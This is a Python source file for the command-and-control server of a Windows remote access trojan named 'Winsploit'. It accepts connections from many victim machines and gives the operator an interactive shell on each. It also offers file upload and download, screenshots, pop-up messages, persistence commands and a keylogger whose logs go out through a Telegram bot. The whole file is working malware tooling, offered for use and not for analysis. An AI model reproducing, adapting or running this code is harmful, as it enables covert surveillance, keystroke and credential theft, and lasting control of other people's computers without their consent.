import socket
import json
import threading
import base64
import requests
import os
import sys
from colorama import Fore, Style, init
init()

# Setting Title
os.system("title #~~Winsploit~~#")

# User Variables
ip='localhost' # IP Address to listen on
port=4444 # Port to listen on
no_of_devices=100 # no. of devices to accept connections from
token='' # telegram bot token
chat_id='' # telegram chat id
delay=10 # seconds to delay in sending keylogs
auto_keylogger=False

# Program's Variables
targets_list=[]
url='https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text=' # telegram api url

# Function to print banner
def banner():
    os.system("cls")
    print(f"""{Fore.RED}

                            ██╗    ██╗██╗███╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
                            ██║    ██║██║████╗  ██║██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
                            ██║ █╗ ██║██║██╔██╗ ██║███████╗██████╔╝██║     ██║   ██║██║   ██║   
                            ██║███╗██║██║██║╚██╗██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
                            ╚███╔███╔╝██║██║ ╚████║███████║██║     ███████╗╚██████╔╝██║   ██║   
                             ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                             ------------------[~ Windows Tracing Framework ]----------------{Style.RESET_ALL}
                                               
                                               {Fore.YELLOW}Listening IP:{Style.RESET_ALL}{Fore.CYAN}{ip}{Style.RESET_ALL}
                                               {Fore.YELLOW}Listening Port:{Style.RESET_ALL}{Fore.CYAN}{port}{Style.RESET_ALL}
                                               {Fore.YELLOW}Max. Devices:{Style.RESET_ALL}{Fore.CYAN}{no_of_devices}{Style.RESET_ALL}
                                               {Fore.YELLOW}Auto Keylogger:{Style.RESET_ALL}{Fore.CYAN}{auto_keylogger}{Style.RESET_ALL}
                                               {Fore.YELLOW}Keylogs Wait Time:{Style.RESET_ALL}{Fore.CYAN}{delay} seconds{Style.RESET_ALL}
                                               
                             ----------------------------------------------------------------\n""")
# Function to send data in json serialized form
def send(client_socket,data):
    data=json.dumps(data)
    client_socket.sendall(data.encode())

# Function to recieve data in json form and deserialize it
def recv(client_socket):
    data=''
    while True:
        data+=(client_socket.recv(1024)).decode()
        try:
            data=json.loads(data)
            break
        except:
            continue
    return data

# Function to accept incoming connections request
def accept():
    global targets_list,no_of_devices,auto_keylogger,url,delay
    while True:
        client_socket, addr = server_socket.accept()
        targets_list.append([client_socket,addr])
        requests.get(url+f"\nConnection Recieved From IP: {addr[0]} And Port: {addr[1]}")
        # Auto Keylogger
        if auto_keylogger:
            send(client_socket,f"keylogger start,{url},{delay}")
            data=recv(client_socket)

# Function to check and show live users
def show_targets():
    print("")
    global targets_list
    rm_list=[]
    counter=1
    for item in targets_list:
        try:
            send(item[0],"Alive?")
            recv(item[0])
            print(Fore.CYAN+str(counter)+") IP Address: "+str(item[1][0])+"\tPort: "+str(item[1][1])+Style.RESET_ALL)
            counter+=1
        except:
            rm_list.append(item)
    targets_list=[x for x in targets_list if x not in rm_list]

# Function to download a file
def download(client_socket,filename):
    data=recv(client_socket)
    data=data.encode()
    with open(filename,"wb") as file:
        file.write(base64.b64decode(data))
    send(client_socket,"Sent")

# Function to upload a file
def upload(client_socket,filename):
    filename=filename.strip()
    with open(filename,"rb") as file:
        data=base64.b64encode(file.read())
    send(client_socket,data.decode())
    recv(client_socket)

# Function to display help menu
def help():
    print(f'''
{Fore.MAGENTA}|----------------------------------[Home Commands]--------------------------------|{Style.RESET_ALL}
{Fore.YELLOW}
1)help                          ==> To View Help Menu.
2)show targets                  ==> To View All Targets.
3)target <target_number>        ==> Interact With A Target.
4)clear                         ==> Clear Server Screen.
5)exit                          ==> Quit Server Only.
{Style.RESET_ALL}
{Fore.MAGENTA}|---------------------------------[Target Commands]-------------------------------|{Style.RESET_ALL}
{Fore.YELLOW}
1)background                    ==> Return To Home Page While Preserving Session.
2)download <filename>           ==> Download A File From Target.
3)upload <filename>             ==> Upload A File To Target.
4)clear                         ==> Clear Server Screen.
5)alert <Text>                  ==> Send Any Text As Pop Up Menu To Target.
6)screenshot <filename>         ==> Take Screenshot Of Target.
7)keylogger start               ==> Start Keylogger In Target.
8)keylogger stop                ==> Stop Keylogger In Target.
9)help                          ==> To View Help Menu.
10)make persistence             ==> To Make Persistence In Target.
11)remove persistence           ==> To Remove Persistence In Target.
12)exit                         ==> Terminate Current Session Of Target.
{Style.RESET_ALL}
{Fore.MAGENTA}|------------------------------------[ EXTRAS ]-----------------------------------|{Style.RESET_ALL}
{Fore.YELLOW}
1) Set auto_persistence=True In Client To Make Auto Persistence When Executed.
2) Be Cautious While Removing Persistence, You May Loose Connection Permanently.
3) Set auto_keylogger=True In Server To Enable Keylogger Automatically.
{Style.RESET_ALL}
{Fore.MAGENTA}|-------------------------------------[ END ]-------------------------------------|{Style.RESET_ALL}
''')

# Function To Communicate To A User
def communicate(client):
    client_socket=client[0]
    addr=client[1]
    while True:
        print("")
        cmd=input(f"{Fore.MAGENTA}{addr}~Shell:{Style.RESET_ALL} ")
        if cmd=="background":
            return
        elif cmd=="help":
            help()
        elif cmd=="exit":
            send(client_socket,cmd)
            return
        elif cmd=="clear":
            banner()
        elif cmd[:8]=="download":
            send(client_socket,cmd)
            download(client_socket,cmd[9:])
            print(f"{Fore.YELLOW}==> File Downloaded!{Style.RESET_ALL}")
        elif cmd[:6]=="upload":
            send(client_socket,cmd)
            upload(client_socket,cmd[7:])
            print(f"{Fore.YELLOW}==> File Uploaded!{Style.RESET_ALL}")
        elif cmd[:15]=="keylogger start":
            send(client_socket,f"{cmd},{url},{delay}")
            data=recv(client_socket)
            print(data)
        elif cmd[:10]=="screenshot":
            send(client_socket,"screenshot")
            data=recv(client_socket)
            data=data.encode()
            data=base64.b64decode(data)
            with open(cmd[10:],'wb') as file:
                file.write(data)
            print(f"{Fore.BLUE}==> Screenshot saved as: {cmd[10:]}{Style.RESET_ALL}")
        else:
            send(client_socket,cmd)
            data = recv(client_socket)
            print("")
            print(f"{Fore.BLUE}{data}{Style.RESET_ALL}")

# Printing Banner
banner()

# Listening to incoming requests
server_socket = socket.socket()
server_socket.bind((ip, port))
server_socket.listen(no_of_devices)

# Starting a thread to accept incoming connections
temp=threading.Thread(target=accept)
temp.start()

# Handling Home Commands
while True:
    print("")
    cmd=input(f"{Fore.GREEN}[+] Enter Command:{Style.RESET_ALL} ")
    if cmd=="show targets":
        show_targets()
    elif cmd=="exit":
        os._exit(0)
    elif cmd[:7]=="target ":
        communicate(targets_list[int(cmd[7:])-1])
    elif cmd=="help":
        help()
    elif cmd=="clear":
        banner()
    else:
        print(f"{Fore.RED}Invalid Command{Style.RESET_ALL}")

